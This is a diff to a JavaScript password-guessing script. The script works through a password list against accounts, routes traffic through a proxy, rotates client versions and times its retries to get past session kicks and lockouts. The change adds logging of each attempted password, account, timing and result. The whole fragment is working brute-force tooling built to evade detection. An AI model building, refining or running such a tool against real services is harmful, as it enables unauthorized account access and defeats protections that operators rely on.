@@ -374,7 +374,9 @@ async function main() {
 
     for (state.currentAttempt; state.currentAttempt < passwords.length; state.currentAttempt++) {
         const password = passwords[state.currentAttempt];
-        
+        const account = getNextTestAccount();
+        const username = account.username;
+
         // Check if we need to wait for session timeout
         const timeSinceLastSession = Date.now() - state.lastSessionEnd;
         if (timeSinceLastSession < config.sessionTimeout) {
@@ -382,8 +384,23 @@ async function main() {
             log(`Waiting ${(waitTime/1000).toFixed(1)} seconds for session timeout...`, 'WAIT');
             await new Promise(resolve => setTimeout(resolve, waitTime));
         }
-        
-        const result = await tryPassword(getNextTestAccount().username, password, proxyUri);
+
+        const attemptStart = Date.now();
+        const result = await tryPassword(username, password, proxyUri);
+        const deltaMs = Date.now() - attemptStart;
+
+        await recordAttempt({
+            timestamp: new Date().toISOString(),
+            account: username,
+            accountType: account.type,
+            password: password,
+            version: supportedVersions[state.versionRotation],
+            result: result,
+            deltaMs: deltaMs,
+            eventType: 'attempt',
+            message: '',
+            consecutiveFailures: state.accountStates[username]?.consecutiveFailures || 0
+        });
         
         if (result === 'success') {
             console.log('\nFound working password:', password);
@@ -391,10 +408,10 @@ async function main() {
         } else if (result === 'kicked') {
             console.log('Too many accounts detected, waiting for session timeout...');
             // Increase wait time based on consecutive failures
-            const waitTime = config.sessionTimeout + (state.accountStates[getNextTestAccount().username].consecutiveFailures * 60000); // Add 1 minute per failure
+            const waitTime = config.sessionTimeout + (state.accountStates[username].consecutiveFailures * 60000); // Add 1 minute per failure
             console.log(`Waiting ${(waitTime/1000).toFixed(1)} seconds (increased due to consecutive failures)...`);
             await new Promise(resolve => setTimeout(resolve, waitTime));
-            state.accountStates[getNextTestAccount().username].lastSessionEnd = Date.now();
+            state.accountStates[username].lastSessionEnd = Date.now();
             state.currentAttempt--; // Retry the same password after waiting
             continue;
         }
